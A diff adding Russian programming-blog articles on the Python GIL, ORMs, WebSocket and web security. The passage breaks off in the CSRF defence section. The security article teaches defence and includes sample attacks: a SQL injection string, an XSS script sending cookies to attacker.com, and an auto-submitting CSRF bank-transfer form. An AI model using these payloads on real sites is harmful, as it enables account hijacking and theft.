@@ -6273,5 +6273,828 @@ npx tsc app.ts</code></pre>
 
       <p>TypeScript — это JavaScript с типами. Даёт автодополнение, ловит ошибки до запуска и делает код понятнее для команды. Компилируется в обычный JS, в браузере типов нет. Учить стоит, если работаешь с большими проектами или в команде. Для мелких скриптов — не обязателен.</p>
     `
+  },
+   {
+    slug: "mnogopotochnost-v-python-gil",
+    title: "Многопоточность в Python — GIL и потоки",
+    excerpt: "Почему потоки в Python не ускоряют вычисления, что такое GIL и когда всё-таки стоит использовать threading, multiprocessing или asyncio.",
+    cover: "img/threading.svg",
+    tags: ["Python", "Разработка", "Теория"],
+    date: "2026-04-12",
+    readTime: 11,
+    content: `
+      <p>У Python репутация «медленного языка для потоков». Правда — сложнее. В этой статье разберём, что такое GIL, почему threading часто не ускоряет код и в каких случаях потоки всё-таки полезны.</p>
+
+      <h2>Потоки и процессы — в чём разница</h2>
+
+      <p>Прежде чем говорить про GIL, надо понять разницу между двумя способами параллельного выполнения.</p>
+
+      <div class="table-scroll">
+      <table>
+        <thead>
+          <tr><th>Критерий</th><th>Потоки (threads)</th><th>Процессы (processes)</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Общая память</td><td>Да</td><td>Нет, каждый со своей</td></tr>
+          <tr><td>Запуск</td><td>Быстро</td><td>Медленнее</td></tr>
+          <tr><td>Обмен данными</td><td>Просто (общие переменные)</td><td>Через очереди и файлы</td></tr>
+          <tr><td>Ускорение CPU-задач</td><td>В Python — нет</td><td>Да</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <p>Потоки живут внутри одного процесса и делят память. Процессы изолированы друг от друга и работают действительно параллельно.</p>
+
+      <h2>Что такое GIL</h2>
+
+      <p>GIL (Global Interpreter Lock) — глобальная блокировка интерпретатора Python. Она означает простое правило: <strong>в один момент времени только один поток может выполнять Python-код</strong>.</p>
+
+      <p>Представь комнату с одним микрофоном. Даже если в комнате десять человек, говорить может только тот, у кого микрофон. Остальные ждут своей очереди.</p>
+
+      <blockquote>GIL — не баг, а осознанный выбор разработчиков CPython. Он делает работу с памятью простой и безопасной, но лишает потоки возможности ускорять вычисления.</blockquote>
+
+      <h2>Проверим на практике</h2>
+
+      <p>Напишем код, который считает сумму чисел в цикле — это чистая работа процессора. Запустим его последовательно и в потоках.</p>
+
+      <pre><code class="language-python">import threading
+import time
+
+def count_sum(n):
+    # Просто крутим цикл и считаем сумму — тяжёлая работа для процессора
+    total = 0
+    for i in range(n):
+        total += i
+    return total
+
+# Последовательно: сначала первая задача, потом вторая
+start = time.time()
+count_sum(10_000_000)
+count_sum(10_000_000)
+print('Последовательно:', round(time.time() - start, 2), 'сек')
+
+# В потоках: запускаем обе одновременно
+start = time.time()
+t1 = threading.Thread(target=count_sum, args=(10_000_000,))
+t2 = threading.Thread(target=count_sum, args=(10_000_000,))
+t1.start()
+t2.start()
+t1.join()   # ждём завершения первого потока
+t2.join()   # и второго
+print('В потоках:', round(time.time() - start, 2), 'сек')</code></pre>
+
+      <p>Если запустишь — увидишь одно и то же время. Потоки не помогли, потому что GIL не давал им работать одновременно.</p>
+
+      <h2>А теперь — задача на ожидание</h2>
+
+      <p>Возьмём другую задачу: имитируем скачивание файлов. Тут мы не работаем процессором, а ждём ответа от сети.</p>
+
+      <pre><code class="language-python">import threading
+import time
+
+def download(name, seconds):
+    print(name, 'начал скачивание')
+    # Имитируем ожидание ответа от сети
+    time.sleep(seconds)
+    print(name, 'завершил')
+
+# Последовательно
+start = time.time()
+download('file1', 1)
+download('file2', 1)
+download('file3', 1)
+print('Последовательно:', round(time.time() - start, 2), 'сек')   # ~3 сек
+
+# В потоках
+start = time.time()
+threads = []
+for i in range(1, 4):
+    t = threading.Thread(target=download, args=('file' + str(i), 1))
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+
+print('В потоках:', round(time.time() - start, 2), 'сек')   # ~1 сек</code></pre>
+
+      <p>Тут потоки дают <strong>трёхкратное ускорение</strong>. Потому что во время ожидания сети GIL освобождается — и другие потоки могут работать.</p>
+
+      <blockquote>GIL не мешает ожиданию. Он мешает только вычислениям.</blockquote>
+
+      <h2>Когда использовать threading</h2>
+
+      <p>Threading полезен для задач ввода-вывода (I/O):</p>
+
+      <ul>
+        <li>Скачивание файлов из сети.</li>
+        <li>Работа с API нескольких сервисов параллельно.</li>
+        <li>Чтение и запись множества файлов.</li>
+        <li>Работа с базой данных, где запросы долгие.</li>
+      </ul>
+
+      <p>Во всех этих задачах программа большую часть времени ждёт — и потоки успевают делать работу друг друга.</p>
+
+      <h2>Когда нужны процессы</h2>
+
+      <p>Для вычислений — обработки изображений, математики, ML — нужен модуль <code>multiprocessing</code>. Он запускает <strong>отдельные процессы</strong> Python, каждый со своим GIL. Это работает по-настоящему параллельно.</p>
+
+      <pre><code class="language-python">from multiprocessing import Pool
+
+def count_sum(n):
+    total = 0
+    for i in range(n):
+        total += i
+    return total
+
+if __name__ == '__main__':
+    # Запускаем 4 процесса одновременно
+    with Pool(4) as pool:
+        results = pool.map(count_sum, [10_000_000] * 4)
+    print('Готово, результатов:', len(results))</code></pre>
+
+      <p>Важно: <code>if __name__ == '__main__':</code> — обязательная защита. Без неё процессы начнут запускаться заново и создадут бесконечный цикл.</p>
+
+      <h2>Когда нужен asyncio</h2>
+
+      <p>Третий путь — асинхронность через <code>asyncio</code>. Она тоже хорошо работает с I/O, но по-другому: не запускает новые потоки, а переключает задачи внутри одного потока.</p>
+
+      <pre><code class="language-python">import asyncio
+
+async def download(name, seconds):
+    print(name, 'начал')
+    await asyncio.sleep(seconds)   # не блокирует другие задачи
+    print(name, 'готов')
+
+async def main():
+    # Запускаем три задачи одновременно
+    await asyncio.gather(
+        download('file1', 1),
+        download('file2', 1),
+        download('file3', 1),
+    )
+
+asyncio.run(main())   # займёт ~1 секунду</code></pre>
+
+      <p>Asyncio легче потоков: нет накладных расходов на переключение контекста. Но требует асинхронных библиотек — обычный <code>requests</code> там не работает.</p>
+
+      <h2>Что выбрать</h2>
+
+      <div class="table-scroll">
+      <table>
+        <thead>
+          <tr><th>Задача</th><th>Инструмент</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Много вычислений</td><td>multiprocessing</td></tr>
+          <tr><td>Много сетевых запросов</td><td>asyncio или threading</td></tr>
+          <tr><td>Работа с файлами</td><td>threading</td></tr>
+          <tr><td>Простые скрипты</td><td>без параллельности</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <p>Не пытайся всё распараллелить. Часто последовательный код быстрее и проще — а выгода от параллельности не окупает сложности.</p>
+
+      <h2>Важно про Python 3.13</h2>
+
+      <p>В новых версиях Python (3.13+) появился экспериментальный режим без GIL. Его можно включить отдельной сборкой. Это большой шаг — но пока он нестабилен и не для продакшена. Следи за развитием, но пиши код так, будто GIL всё ещё есть.</p>
+
+      <h2>Итог</h2>
+
+      <p>GIL мешает потокам ускорять вычисления, но не мешает при ожидании. Для I/O — <code>threading</code> или <code>asyncio</code>. Для CPU — <code>multiprocessing</code>. Понимание GIL спасает от классической ошибки новичка: «запущу вычисления в потоках и станет быстрее».</p>
+    `
+  },
+  {
+    slug: "chto-takoe-orm",
+    title: "Что такое ORM — работа с базой через объекты",
+    excerpt: "Зачем писать SQL, если можно работать с базой как с обычными объектами. Разбираем ORM: как работает, плюсы и минусы, примеры на SQLAlchemy.",
+    cover: "img/orm.svg",
+    tags: ["Базы данных", "Разработка", "Python"],
+    date: "2026-04-13",
+    readTime: 10,
+    content: `
+      <p>Когда пишешь код, работать с базой через SQL не всегда удобно. Строки запросов, ручное превращение данных в объекты, повторяющийся код. ORM решает это, позволяя общаться с базой как с обычными объектами Python или JavaScript.</p>
+
+      <h2>Что такое ORM</h2>
+
+      <p>ORM (Object-Relational Mapping) — это библиотека, которая <strong>превращает таблицы базы данных в классы, а строки — в объекты</strong>. Ты работаешь с объектами, а ORM сама генерирует SQL под капотом.</p>
+
+      <p>Пример сравнения. Одна и та же задача: найти пользователя по email.</p>
+
+      <h3>Без ORM — чистый SQL</h3>
+
+      <pre><code class="language-python">import sqlite3
+
+conn = sqlite3.connect('app.db')
+cursor = conn.cursor()
+cursor.execute(
+    'SELECT id, name, email FROM users WHERE email = ?',
+    ('kirill@mail.ru',)
+)
+row = cursor.fetchone()
+# row — это кортеж: (1, 'Кирилл', 'kirill@mail.ru')
+# приходится вручную делать user = {'id': row[0], 'name': row[1], ...}</code></pre>
+
+      <h3>С ORM — обычные объекты</h3>
+
+      <pre><code class="language-python">from sqlalchemy.orm import Session
+
+user = session.query(User).filter(User.email == 'kirill@mail.ru').first()
+# user — это объект класса User
+print(user.name)   # обращаемся как к обычному атрибуту</code></pre>
+
+      <p>Во втором случае ORM сама сгенерировала SQL, выполнила его и превратила результат в объект. Тебе остаётся работать с данными как с обычными Python-объектами.</p>
+
+      <h2>Как это выглядит с моделями</h2>
+
+      <p>В ORM ты описываешь таблицы через классы — они называются <strong>модели</strong>.</p>
+
+      <pre><code class="language-python">from sqlalchemy import Column, Integer, String
+from sqlalchemy.orm import declarative_base
+
+Base = declarative_base()
+
+class User(Base):
+    __tablename__ = 'users'   # имя таблицы в базе
+
+    id = Column(Integer, primary_key=True)
+    name = Column(String(100), nullable=False)
+    email = Column(String(200), unique=True, nullable=False)</code></pre>
+
+      <p>Этот класс описывает таблицу. По нему ORM поймёт, как создавать таблицу и как маппить строки в объекты.</p>
+
+      <h2>Основные операции</h2>
+
+      <h3>Создать</h3>
+
+      <pre><code class="language-python">user = User(name='Кирилл', email='kirill@mail.ru')
+session.add(user)
+session.commit()   # сохраняем в базу
+print(user.id)     # ORM сама подставила id после вставки</code></pre>
+
+      <h3>Прочитать</h3>
+
+      <pre><code class="language-python"># Все пользователи
+users = session.query(User).all()
+
+# Первый с таким email
+user = session.query(User).filter(User.email == 'kirill@mail.ru').first()
+
+# С сортировкой и ограничением
+top = session.query(User).order_by(User.name).limit(10).all()</code></pre>
+
+      <h3>Обновить</h3>
+
+      <pre><code class="language-python">user = session.query(User).get(1)
+user.name = 'Кирилл Петрович'   # просто меняем атрибут
+session.commit()                # ORM сама сделает UPDATE</code></pre>
+
+      <h3>Удалить</h3>
+
+      <pre><code class="language-python">user = session.query(User).get(1)
+session.delete(user)
+session.commit()</code></pre>
+
+      <h2>Связи между таблицами</h2>
+
+      <p>Одно из главных удобств ORM — связи. Вместо JOIN ты используешь обычные атрибуты.</p>
+
+      <pre><code class="language-python">from sqlalchemy import ForeignKey
+from sqlalchemy.orm import relationship
+
+class Order(Base):
+    __tablename__ = 'orders'
+
+    id = Column(Integer, primary_key=True)
+    user_id = Column(Integer, ForeignKey('users.id'))
+    total = Column(Integer)
+
+    # ORM понимает: заказ принадлежит одному пользователю
+    user = relationship('User', back_populates='orders')
+
+class User(Base):
+    __tablename__ = 'users'
+
+    id = Column(Integer, primary_key=True)
+    name = Column(String(100))
+    email = Column(String(200))
+
+    # А у пользователя много заказов
+    orders = relationship('Order', back_populates='user')</code></pre>
+
+      <p>Теперь можно работать так:</p>
+
+      <pre><code class="language-python"># Получить все заказы пользователя — без SQL, через атрибут
+user = session.query(User).get(1)
+for order in user.orders:
+    print(order.total)
+
+# Или наоборот — от заказа к пользователю
+order = session.query(Order).get(10)
+print(order.user.name)</code></pre>
+
+      <p>ORM сама сделает JOIN и подгрузит нужные данные.</p>
+
+      <h2>Популярные ORM</h2>
+
+      <div class="table-scroll">
+      <table>
+        <thead>
+          <tr><th>Язык</th><th>ORM</th><th>Особенность</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Python</td><td>SQLAlchemy</td><td>Мощная, гибкая, но сложнее старт</td></tr>
+          <tr><td>Python</td><td>Django ORM</td><td>Встроена в Django, простая</td></tr>
+          <tr><td>Python</td><td>Peewee</td><td>Минималистичная, для маленьких проектов</td></tr>
+          <tr><td>JavaScript</td><td>Prisma</td><td>Современная, типы из коробки</td></tr>
+          <tr><td>JavaScript</td><td>Sequelize</td><td>Классика для Node.js</td></tr>
+          <tr><td>Java</td><td>Hibernate</td><td>Стандарт индустрии</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2>Плюсы ORM</h2>
+
+      <ul>
+        <li><strong>Меньше кода.</strong> Не пишешь SQL руками — просто работаешь с объектами.</li>
+        <li><strong>Защита от инъекций.</strong> ORM экранирует значения автоматически.</li>
+        <li><strong>Не зависишь от СУБД.</strong> Один и тот же код работает с Postgres, MySQL, SQLite. Меняешь базу — код остаётся.</li>
+        <li><strong>Типы и автодополнение.</strong> В редакторе видно поля модели.</li>
+        <li><strong>Миграции.</strong> Многие ORM умеют обновлять схему базы автоматически.</li>
+      </ul>
+
+      <h2>Минусы ORM</h2>
+
+      <ul>
+        <li><strong>Сложные запросы — боль.</strong> Аналитика с десятком JOIN на ORM превращается в кашу.</li>
+        <li><strong>Проблема N+1.</strong> Если наивно пройтись по списку и обратиться к связанным объектам, ORM сделает отдельный запрос на каждого — сотни SQL-запросов вместо двух.</li>
+        <li><strong>Скрытая магия.</strong> Не всегда понятно, какой SQL уходит в базу. Приходится включать логи.</li>
+        <li><strong>Производительность.</strong> Иногда ORM-запрос в разы медленнее написанного вручную.</li>
+        <li><strong>Порог входа.</strong> SQLAlchemy с её сессиями и relationships пугает новичков.</li>
+      </ul>
+
+      <h2>Проблема N+1</h2>
+
+      <p>Классическая ловушка ORM. Показываю на примере.</p>
+
+      <pre><code class="language-python"># Наивно: получаем 100 заказов, потом у каждого спрашиваем пользователя
+orders = session.query(Order).limit(100).all()
+for order in orders:
+    print(order.user.name)   # на каждой итерации — отдельный SQL-запрос
+# Итого: 101 запрос к базе вместо 2</code></pre>
+
+      <p>Решение — <strong>жадная загрузка</strong>. Заранее указываешь ORM, что нужно подгрузить связанные данные одним запросом:</p>
+
+      <pre><code class="language-python">from sqlalchemy.orm import joinedload
+
+# Один JOIN вместо 101 запроса
+orders = session.query(Order).options(
+    joinedload(Order.user)
+).limit(100).all()
+
+for order in orders:
+    print(order.user.name)   # уже загружено, никаких лишних запросов</code></pre>
+
+      <h2>Когда ORM не подходит</h2>
+
+      <ul>
+        <li><strong>Сложные аналитические запросы.</strong> Если у тебя десяток JOIN и оконные функции — пиши SQL руками.</li>
+        <li><strong>Высоконагруженные системы.</strong> ORM добавляет оверхед, и в hot-path это критично.</li>
+        <li><strong>Задачи на миллионы строк.</strong> Тут важна каждая миллисекунда, ORM только мешает.</li>
+        <li><strong>Скрипты на 20 строк.</strong> Проще сделать пару запросов через <code>sqlite3</code>, чем ставить SQLAlchemy.</li>
+      </ul>
+
+      <blockquote>ORM — инструмент, а не религия. В одном проекте можно использовать и ORM для CRUD, и чистый SQL для отчётов. Это нормально.</blockquote>
+
+      <h2>Итог</h2>
+
+      <p>ORM превращает таблицы в классы и позволяет работать с базой как с обычными объектами. Убирает повторяющийся код, защищает от инъекций, даёт единый интерфейс к разным СУБД. Но у неё есть свои проблемы — N+1, скрытые запросы, сложности с аналитикой. Используй там, где она облегчает, и не бойся спускаться на уровень SQL, когда нужно.</p>
+    `
+  },
+  {
+    slug: "kak-rabotaet-websocket",
+    title: "Как работает WebSocket — real-time связь между браузером и сервером",
+    excerpt: "Почему обычный HTTP плохо подходит для чатов, игр и бирж. Разбираем WebSocket: handshake, кадры, когда нужен и какие есть альтернативы.",
+    cover: "img/websocket.svg",
+    tags: ["Веб", "Сети", "Разработка"],
+    date: "2026-04-14",
+    readTime: 10,
+    content: `
+      <p>Если делаешь чат, биржевой терминал, онлайн-игру или просто уведомления в реальном времени — обычный HTTP будет мешать. Сервер не может «сам» отправить данные клиенту. Для таких задач есть WebSocket.</p>
+
+      <h2>Проблема HTTP</h2>
+
+      <p>HTTP работает по схеме «запрос-ответ». Клиент спрашивает — сервер отвечает. Сервер не может первым обратиться к клиенту.</p>
+
+      <p>Что делать, если нужно получать сообщения из чата в реальном времени? Есть три плохих способа.</p>
+
+      <h3>1. Постоянные запросы (polling)</h3>
+
+      <p>Клиент каждую секунду спрашивает: «Есть новые сообщения?». В 99% случаев ответ пустой — а трафик тратится.</p>
+
+      <pre><code class="language-javascript">// Каждую секунду — новый HTTP-запрос
+setInterval(function() {
+  fetch('/api/messages?since=' + lastId)
+    .then(function(r) { return r.json(); })
+    .then(function(messages) {
+      messages.forEach(showMessage);
+    });
+}, 1000);</code></pre>
+
+      <h3>2. Длинные запросы (long polling)</h3>
+
+      <p>Клиент отправляет запрос и держит его открытым, пока сервер не ответит. Как только ответ пришёл — сразу новый запрос. Уже лучше, но нагрузка огромная.</p>
+
+      <h3>3. Server-Sent Events</h3>
+
+      <p>Сервер отправляет поток данных в одну сторону — от себя к клиенту. Работает для новостных лент, но не для чата: клиент не может так же легко отвечать.</p>
+
+      <h2>Что такое WebSocket</h2>
+
+      <p>WebSocket — это протокол для <strong>двустороннего постоянного соединения</strong>. Один раз установил — и клиент, и сервер могут отправлять данные друг другу в любой момент.</p>
+
+      <blockquote>WebSocket — это как телефонный разговор: соединились один раз и говорите, пока кто-то не положит трубку. HTTP — как переписка письмами: каждый раз нужно новое сообщение.</blockquote>
+
+      <h2>Как устанавливается соединение</h2>
+
+      <p>Соединение начинается с обычного HTTP-запроса — это называется <strong>handshake</strong>.</p>
+
+      <ol>
+        <li>Клиент отправляет HTTP-запрос со специальным заголовком <code>Upgrade: websocket</code>.</li>
+        <li>Сервер отвечает кодом <code>101 Switching Protocols</code> — «согласен, переключаемся».</li>
+        <li>Дальше то же TCP-соединение используется для общения по правилам WebSocket.</li>
+      </ol>
+
+      <p>После handshake начинается двусторонний обмен короткими сообщениями — <strong>кадрами</strong>.</p>
+
+      <h2>Клиент на JavaScript</h2>
+
+      <pre><code class="language-javascript">// Открываем соединение с сервером
+var socket = new WebSocket('wss://example.com/chat');
+
+// Соединение установлено
+socket.onopen = function() {
+  console.log('Соединение открыто');
+  socket.send('Привет, сервер!');
+};
+
+// Пришло сообщение от сервера
+socket.onmessage = function(event) {
+  console.log('Сообщение:', event.data);
+};
+
+// Ошибка или закрытие
+socket.onerror = function(error) {
+  console.error('Ошибка:', error);
+};
+
+socket.onclose = function() {
+  console.log('Соединение закрыто');
+};
+
+// Отправить данные в любой момент
+function sendMessage(text) {
+  if (socket.readyState === WebSocket.OPEN) {
+    socket.send(text);
   }
+}</code></pre>
+
+      <p>Обрати внимание на <code>wss://</code> — это защищённая версия WebSocket, как HTTPS для HTTP. Всегда используй её в проде.</p>
+
+      <h2>Сервер на Python</h2>
+
+      <p>Самый простой способ — библиотека <code>websockets</code>.</p>
+
+      <pre><code class="language-python">import asyncio
+import websockets
+
+# Множество активных клиентов
+clients = set()
+
+async def handler(websocket):
+    # Регистрируем нового клиента
+    clients.add(websocket)
+    print('Подключился клиент, всего:', len(clients))
+
+    try:
+        async for message in websocket:
+            # Пришло сообщение — рассылаем всем клиентам
+            print('Получено:', message)
+            for client in clients:
+                await client.send(message)
+    finally:
+        # Клиент отключился — убираем его
+        clients.remove(websocket)
+        print('Клиент отключился, осталось:', len(clients))
+
+async def main():
+    # Запускаем сервер на порту 8765
+    async with websockets.serve(handler, 'localhost', 8765):
+        print('Сервер запущен на ws://localhost:8765')
+        await asyncio.Future()   # работаем вечно
+
+asyncio.run(main())</code></pre>
+
+      <p>Это минимальный чат. Все клиенты получают все сообщения — а сервер живёт одним бесконечным циклом.</p>
+
+      <h2>Что важно знать про соединение</h2>
+
+      <h3>Обрыв связи</h3>
+
+      <p>WebSocket-соединение может разорваться: пропал интернет, сервер перезапустился, мобильное устройство уснуло. Клиент должен уметь <strong>переподключаться</strong> автоматически.</p>
+
+      <pre><code class="language-javascript">function connect() {
+  var socket = new WebSocket('wss://example.com/chat');
+
+  socket.onopen = function() {
+    console.log('Соединение установлено');
+  };
+
+  socket.onclose = function() {
+    console.log('Соединение закрыто, переподключаемся через 3 секунды');
+    // Через 3 секунды пробуем снова
+    setTimeout(connect, 3000);
+  };
+}
+
+connect();</code></pre>
+
+      <h3>Heartbeat (пинг-понг)</h3>
+
+      <p>Чтобы соединение не закрылось само по таймауту, клиент периодически отправляет «пинг» — короткое пустое сообщение. Сервер отвечает «понг».</p>
+
+      <pre><code class="language-javascript">// Каждые 30 секунд — проверка, что соединение живо
+setInterval(function() {
+  if (socket.readyState === WebSocket.OPEN) {
+    socket.send(JSON.stringify({ type: 'ping' }));
+  }
+}, 30000);</code></pre>
+
+      <h3>Состояния соединения</h3>
+
+      <div class="table-scroll">
+      <table>
+        <thead>
+          <tr><th>Код</th><th>Состояние</th><th>Что значит</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>0</td><td>CONNECTING</td><td>Идёт handshake</td></tr>
+          <tr><td>1</td><td>OPEN</td><td>Можно отправлять и получать</td></tr>
+          <tr><td>2</td><td>CLOSING</td><td>Соединение закрывается</td></tr>
+          <tr><td>3</td><td>CLOSED</td><td>Уже закрыто</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2>Где применяется WebSocket</h2>
+
+      <ul>
+        <li><strong>Чаты и мессенджеры.</strong> Мгновенная доставка сообщений.</li>
+        <li><strong>Онлайн-игры.</strong> Позиции игроков обновляются десятки раз в секунду.</li>
+        <li><strong>Биржевые терминалы.</strong> Курсы акций в реальном времени.</li>
+        <li><strong>Совместное редактирование.</strong> Google Docs, Figma — все изменения сразу видны.</li>
+        <li><strong>Уведомления.</strong> Push-сообщения без перезагрузки страницы.</li>
+        <li><strong>Стриминг данных.</strong> Логи, метрики, телеметрия.</li>
+      </ul>
+
+      <h2>WebSocket vs HTTP</h2>
+
+      <div class="table-scroll">
+      <table>
+        <thead>
+          <tr><th>Критерий</th><th>HTTP</th><th>WebSocket</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Соединение</td><td>Новое на каждый запрос</td><td>Одно постоянное</td></tr>
+          <tr><td>Направление</td><td>Клиент → сервер</td><td>В обе стороны</td></tr>
+          <tr><td>Оверхед</td><td>Много заголовков на каждый запрос</td><td>Минимальный</td></tr>
+          <tr><td>Инициатор</td><td>Клиент</td><td>И клиент, и сервер</td></tr>
+          <tr><td>Кэширование</td><td>Работает</td><td>Нет</td></tr>
+          <tr><td>Когда использовать</td><td>Загрузка страниц, API</td><td>Real-time данные</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2>Альтернативы</h2>
+
+      <p>WebSocket — не единственный вариант для real-time. Есть ещё:</p>
+
+      <ul>
+        <li><strong>Socket.IO.</strong> Библиотека поверх WebSocket с автоматическим fallback на long polling, если WebSocket не работает. Удобна, но добавляет вес.</li>
+        <li><strong>Server-Sent Events (SSE).</strong> Односторонний поток от сервера к клиенту. Проще WebSocket, работает поверх HTTP.</li>
+        <li><strong>WebRTC.</strong> Прямое соединение между браузерами — для видео и аудио.</li>
+        <li><strong>gRPC streaming.</strong> Двусторонний поток для микросервисов.</li>
+      </ul>
+
+      <h2>Частые ошибки</h2>
+
+      <ul>
+        <li><strong>Забыть про переподключение.</strong> Соединение оборвётся — и без авто-реконнекта клиент перестанет получать данные.</li>
+        <li><strong>Открывать много сокетов.</strong> Один сокет на вкладку — достаточно. Не создавай новый на каждый компонент.</li>
+        <li><strong>Забыть про wss.</strong> В проде — только защищённое соединение.</li>
+        <li><strong>Хранить состояние только в памяти сервера.</strong> При перезапуске всё пропадёт. Для серьёзных систем состояние держат в Redis или базе.</li>
+      </ul>
+
+      <h2>Итог</h2>
+
+      <p>WebSocket — протокол для двусторонней связи в реальном времени. Устанавливается один раз через HTTP-handshake, дальше обмен идёт напрямую. Идеален для чатов, игр, бирж и уведомлений. Требует аккуратности: переподключение, heartbeat, wss. Для обычных сайтов с загрузкой страниц — не нужен, там HTTP достаточно.</p>
+    `
+  },
+  {
+    slug: "xss-csrf-sql-inekcii",
+    title: "XSS, CSRF, SQL-инъекции — три главные атаки на веб",
+    excerpt: "Разбираем три самых частых уязвимости в веб-приложениях: как работают, чем опасны и как защититься. С примерами атак и защиты.",
+    cover: "img/security.svg",
+    tags: ["Безопасность", "Веб", "Разработка"],
+    date: "2026-04-15",
+    readTime: 12,
+    content: `
+      <p>Большинство взломов происходит не через хитрые эксплойты нулевого дня, а через три классические уязвимости, которые существуют уже 20 лет. XSS, CSRF и SQL-инъекции до сих пор в топе по количеству атак — потому что разработчики продолжают их допускать.</p>
+
+      <h2>Уязвимость 1. SQL-инъекция</h2>
+
+      <p>Самая старая и разрушительная. Происходит, когда пользовательский ввод попадает в SQL-запрос без обработки.</p>
+
+      <h3>Как это работает</h3>
+
+      <p>Типичный уязвимый код:</p>
+
+      <pre><code class="language-python"># ОПАСНО! Не делай так
+def get_user(username):
+    query = "SELECT * FROM users WHERE name = '" + username + "'"
+    cursor.execute(query)
+    return cursor.fetchone()
+
+# Пользователь вводит: admin' OR '1'='1
+# Запрос становится: SELECT * FROM users WHERE name = 'admin' OR '1'='1'
+# Условие всегда истинно — вернутся ВСЕ пользователи</code></pre>
+
+      <p>Что может сделать злоумышленник:</p>
+
+      <ul>
+        <li>Получить все данные из таблицы.</li>
+        <li>Обойти аутентификацию (зайти без пароля).</li>
+        <li>Удалить таблицы (<code>DROP TABLE users</code>).</li>
+        <li>В некоторых СУБД — выполнить команды на сервере.</li>
+      </ul>
+
+      <h3>Как защититься</h3>
+
+      <p><strong>Параметризованные запросы.</strong> Единственный правильный способ. Значения передаются отдельно от SQL — база сама их экранирует.</p>
+
+      <pre><code class="language-python"># БЕЗОПАСНО
+def get_user(username):
+    query = "SELECT * FROM users WHERE name = ?"
+    cursor.execute(query, (username,))
+    return cursor.fetchone()
+
+# Пользователь вводит: admin' OR '1'='1
+# База ищет пользователя с буквально таким именем.
+# Такого пользователя нет — вернётся пусто</code></pre>
+
+      <p>Правила:</p>
+
+      <ul>
+        <li><strong>Никогда</strong> не склеивай SQL-строки вручную.</li>
+        <li>Используй <code>?</code> (SQLite, MySQL) или <code>%s</code> (PostgreSQL) как плейсхолдеры.</li>
+        <li>ORM делает это автоматически — ещё один плюс в её пользу.</li>
+      </ul>
+
+      <h2>Уязвимость 2. XSS (Cross-Site Scripting)</h2>
+
+      <p>XSS происходит, когда злоумышленник может <strong>внедрить JavaScript на твою страницу</strong>. Браузер считает его частью сайта и выполняет с твоими правами.</p>
+
+      <h3>Как это работает</h3>
+
+      <p>Представь комментарии на сайте. Пользователь оставляет такой текст:</p>
+
+      <pre><code class="language-html">&lt;script&gt;
+  fetch('https://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+
+      <p>Если сервер вставляет этот комментарий на страницу без экранирования — браузер выполнит скрипт. А скрипт отправит куки злоумышленнику. Куки = доступ к аккаунту.</p>
+
+      <h3>Что может сделать XSS</h3>
+
+      <ul>
+        <li>Украсть сессионные куки и токены.</li>
+        <li>Читать переписку и вводимые данные.</li>
+        <li>Перенаправлять на фишинговые сайты.</li>
+        <li>Менять содержимое страницы — например, подменить форму оплаты.</li>
+        <li>Отправлять запросы от имени пользователя.</li>
+      </ul>
+
+      <h3>Три типа XSS</h3>
+
+      <div class="table-scroll">
+      <table>
+        <thead>
+          <tr><th>Тип</th><th>Где живёт скрипт</th><th>Когда срабатывает</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Хранимый</td><td>В базе данных</td><td>При каждой загрузке страницы</td></tr>
+          <tr><td>Отражённый</td><td>В URL запроса</td><td>Сразу после клика по ссылке</td></tr>
+          <tr><td>DOM-based</td><td>В JavaScript на клиенте</td><td>При обработке данных на странице</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <p>Хранимый — самый опасный. Один раз заразил базу — и все пользователи получают вирус.</p>
+
+      <h3>Как защититься</h3>
+
+      <p><strong>Экранируй всё, что выводишь.</strong> Заменяй служебные символы на HTML-сущности.</p>
+
+      <pre><code class="language-python"># Плохо: вставляем как есть
+html = '&lt;p&gt;' + comment + '&lt;/p&gt;'
+
+# Хорошо: экранируем символы
+def escape_html(text):
+    return (
+        text
+        .replace('&amp;', '&amp;amp;')
+        .replace('&lt;', '&amp;lt;')
+        .replace('&gt;', '&amp;gt;')
+        .replace('"', '&amp;quot;')
+        .replace("'", '&amp;#39;')
+    )
+
+html = '&lt;p&gt;' + escape_html(comment) + '&lt;/p&gt;'</code></pre>
+
+      <p>После экранирования тег <code>&lt;script&gt;</code> превращается в безобидный текст — браузер покажет его, но не выполнит.</p>
+
+      <p>Дополнительные меры:</p>
+
+      <ul>
+        <li><strong>Content Security Policy (CSP).</strong> HTTP-заголовок, который запрещает выполнение сторонних скриптов.</li>
+        <li><strong>httpOnly cookie.</strong> JavaScript не увидит такие куки — украсть их нельзя.</li>
+        <li><strong>Не используй <code>innerHTML</code>.</strong> В JS для вставки текста бери <code>textContent</code>.</li>
+      </ul>
+
+      <h2>Уязвимость 3. CSRF (Cross-Site Request Forgery)</h2>
+
+      <p>CSRF — «межсайтовая подделка запроса». Атака, при которой злоумышленник заставляет браузер пользователя <strong>выполнить действие на чужом сайте</strong>, где тот уже авторизован.</p>
+
+      <h3>Как это работает</h3>
+
+      <p>Ты залогинен в онлайн-банке. Заходишь на другой сайт — например, форум. На форуме спрятана форма:</p>
+
+      <pre><code class="language-html">&lt;form action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="to" value="attacker_account"&gt;
+  &lt;input type="hidden" name="amount" value="100000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+
+      <p>Ты просто зашёл на страницу — а форма отправляется автоматически. Браузер приложит куки банка (потому что домен банка совпадает) — и банк выполнит перевод. Ты об этом даже не узнаешь.</p>
+
+      <blockquote>CSRF работает потому, что браузер автоматически прикладывает куки к запросам на тот домен, где они были выданы. Злоумышленнику не нужно знать твои куки — достаточно заставить браузер их использовать.</blockquote>
+
+      <h3>Как защититься</h3>
+
